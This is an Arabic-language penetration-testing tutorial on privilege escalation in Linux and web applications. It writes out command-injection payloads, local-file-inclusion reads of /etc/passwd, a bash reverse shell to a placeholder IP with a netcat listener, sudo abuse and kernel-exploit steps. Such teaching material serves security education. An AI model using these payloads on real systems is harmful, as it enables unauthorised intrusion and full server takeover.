# **1. تعريف Privilege Escalation (تصعيد الصلاحيات)**

## **الشرح العميق:**
ال Privilege Escalation (تصعيد الصلاحيات) هو عملية يحاول فيها المهاجم أو المخترق ياخد صلاحيات أعلى من اللي عنده على نظام أو تطبيق. يعني لو دخلت على جهاز كمستخدم عادي (limited user)، بتحاول توصل لصلاحيات المسؤول (Administrator أو root) عشان تقدر تتحكم في كل حاجة. فيه نوعين رئيسيين:

1. **Vertical Privilege Escalation:** من مستخدم عادي لمستخدم بصلاحيات عالية (زي root أو admin).
2. **Horizontal Privilege Escalation:** من مستخدم عادي لمستخدم عادي تاني لكن بصلاحيات مختلفة (زي الوصول لحساب مستخدم تاني).


في سياق الويب، ده بيحصل لما تطبيق ويب (زي موقع) فيه ثغرة تسمح للمستخدم العادي يعدّل أو يتحكم في حاجات المفروض تكون للأدمن بس، زي تغيير بيانات، تشغيل أوامر، أو الوصول لملفات حساسة.

## **الأدوات والأوامر العملية:**

### 1. **فحص المستخدم الحالي:**

   - لو على لينكس:   `id`
   
     - مثال نتيجة: `uid=1000(user) gid=1000(user) groups=1000(user)`
     - لو root: `uid=0(root)`.


   - لو على ويندوز:  `whoami`

     - مثال: `user-pc\user` (مستخدم عادي) أو `nt authority\system` (أعلى صلاحية).

### 2. **محاولة تصعيد يدوي بسيط:**

   - على لينكس: `sudo -l`

     - بيوريك الأوامر اللي ممكن تشغلها كـ root لو كان عندك إذن.


   - مثال: لو لقيت `(root) NOPASSWD: /bin/bash`، شغل `sudo /bin/bash` وهتبقى root.

### 3. **في الويب (مثال ثغرة):**

   - لو موقع فيه ثغرة Parameter Tampering:
     - افترض رابط زي: `http://example.com/profile?user_id=123`
     - عدّل الـ ID لـ `user_id=1` (غالبًا Admin) وشوف لو بيفتح حساب الأدمن.

## **خلاصة للطفل:**
"زي لما تكون ضيف في بيت وتقدر تدخل المطبخ بس، لكن تلاقي طريقة تدخل بيها أوضة صاحب البيت وتتحكم في كل حاجة! تصعيد الصلاحيات يعني تاخد مفتاح أكبر من اللي معاك."

---

# **2. تأثير Privilege Escalation على أمان الويب**

## **الشرح العميق:**
لما يحصل تصعيد صلاحيات في تطبيق ويب، التأثير بيكون خطير جدًا لأن المهاجم بيقدر يعمل حاجات زي:

- **سرقة بيانات حساسة:** زي بيانات المستخدمين أو كلمات السر.
- **تعديل الموقع:** يغير محتوى الصفحات أو يضيف أكواد ضارة.
- **التحكم في السيرفر:** لو وصل لصلاحيات root/admin على السيرفر بتاع الموقع، يقدر يشغل أوامر أو يدمر النظام كله.
- **الهجمات الممتدة:** يستخدم الموقع كقاعدة لمهاجمة أنظمة تانية.

الثغرات اللي بتؤدي لتصعيد الصلاحيات في الويب بتكون زي ضعف التحقق من الهوية (Broken Authentication)، سوء الإعدادات (Misconfiguration)، أو حقن الأوامر (Command Injection).

## **الأدوات والأوامر العملية:**

### 1. **Command Injection في الويب:**
   - لو موقع بياخد إدخال منك وينفذه:
     - رابط: `http://example.com/ping?ip=127.0.0.1`
     - جرب: `http://example.com/ping?ip=127.0.0.1; whoami`
     - لو رجعلك اسم المستخدم (زي www-data)، يبقى فيه ثغرة.

### 2. **Local File Inclusion (LFI) لتصعيد:**
   - رابط: `http://example.com?page=about.php`
   - جرب: `http://example.com?page=/etc/passwd`
     - لو ظهر ملف passwd، حاول تصعيد بـ:
     - `http://example.com?page=/proc/self/environ` (تشوف بيئة النظام).



### 3. **Metasploit لاستغلال ثغرة:**
   - لو لقيت ثغرة في خدمة ويب:
     - `msfconsole`
     - `use exploit/multi/http/<module_name>`
     - `set RHOST <IP>`
     - `exploit`
   - لو نجحت، هتاخد shell وتقدر تصعد صلاحيات.

#### **خلاصة للطفل:**
"لما تتحكم في موقع، زي لما تكون لعبت لعبة واخدت كل القوة! المهاجم بيقدر يسرق حاجات، يخرب البيت، أو يتحكم في كل حاجة لو لقى الباب مفتوح."

---

# **3. ليه مهم نفهم ده وإزاي نستغله؟**

- **الهدف:** لو اختبرت موقع (كـ Pentester)، لازم تعرف الثغرات اللي ممكن تؤدي لتصعيد وتستغلها عشان تثبت خطورتها.
- **مثال عملي:** لو لقيت Command Injection، ممكن تشغل أوامر زي `whoami` أو `id`، وبعدها تبحث عن طريقة تصير root.
- **أدوات إضافية:**
  - `searchsploit`:
    - `searchsploit php 7.2 command injection`
    - بيطلعلك ثغرات مرتبطة بالإصدار.

#### **خلاصة للطفل:**
"لما تعرف إزاي تدخل وتتحكم، بتبقى زي بطل خارق بيقدر يفتح كل الأبواب ويثبت إن البيت مش أمان!"

---

# **خطوات عملية للاستغلال في Pentesting**

## **الخطوة 1: فحص الموقع**
- استخدم Nmap لفحص السيرفر:
  - `nmap -sV 192.168.1.10`
- افترض النتيجة:
  - Port 80: Apache 2.4.29
  - Port 22: OpenSSH 5.3

## **الخطوة 2: اختبار ثغرات الويب**
- جرب Command Injection:
  - `http://192.168.1.10/ping?ip=127.0.0.1; id`
  - لو رجعلك `uid=33(www-data)`، يبقى فيه ثغرة.
- جرب LFI:
  - `http://192.168.1.10?page=/etc/passwd`
  - لو ظهر الملف، ابحث عن ملفات زي `/var/www/html/config.php` لكلمات سر.

## **الخطوة 3: استغلال الثغرة**
- لو لقيت Command Injection:
  - أضف أمر زي: `; /bin/bash -i >& /dev/tcp/<your_IP>/4444 0>&1`
  - شغل Netcat على جهازك: `nc -lvnp 4444`
  - لو نجح، هتاخد shell.

## **الخطوة 4: تصعيد الصلاحيات**
- على الـ Shell:
  - `id` (تشوف مين أنت، مثلاً www-data).
  - `sudo -l` (تشوف لو فيه أوامر بصلاحيات root).
  - لو لقيت مثلاً `sudo /bin/bash`، شغله وهتبقى root.
- لو مفيش sudo:
  - ابحث عن Kernel Exploit:
    - `uname -r` (تعرف إصدار النواة، زي 2.6.32).
    - `searchsploit linux kernel 2.6.32`
    - نزل السكربت وشغله على السيرفر.

## **الخطوة 5: توثيق وتنظيف**
- سجل كل خطوة (لتقرير الـ Pentest).
- لو خلّصت، امسح أي أثر (زي السكربتات) لو ده جزء من الاتفاق.

## **خلاصة للطفل:**
"زي لما تلعب لعبة مغامرات: تدور على الثغرة زي كنز، تستخدمها عشان تفتح الباب الكبير، وتصير الملك بتاع الموقع!"

---

# **الخلاصة النهائية:**
Privilege Escalation هو مفتاح التحكم الكامل في نظام أو موقع. في الويب، بتدور على ثغرات زي Command Injection أو LFI، وبعدين تستغلها عشان تاخد shell وتصعد لصلاحيات أعلى. بالأدوات زي Nmap، Netcat، وMetasploit، تقدر تكتشف وتستغل كل نقطة ضعف بسهولة لو خططت صح!